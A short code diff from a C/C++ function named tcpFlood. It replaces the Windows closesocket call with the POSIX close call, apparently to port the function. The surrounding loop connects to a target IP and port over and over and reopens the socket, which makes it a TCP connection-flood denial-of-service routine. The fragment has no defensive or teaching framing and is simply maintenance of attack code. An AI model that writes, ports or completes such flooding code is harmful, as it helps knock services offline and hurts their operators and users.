@@ -47,7 +47,7 @@ void tcpFlood(string ip, int port) {
 
     while (true) {
         if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
-            closesocket(sockfd); // Update this line
+            close(sockfd); // Update this line
             sockfd = socket(AF_INET, SOCK_STREAM, 0);
         }
     }
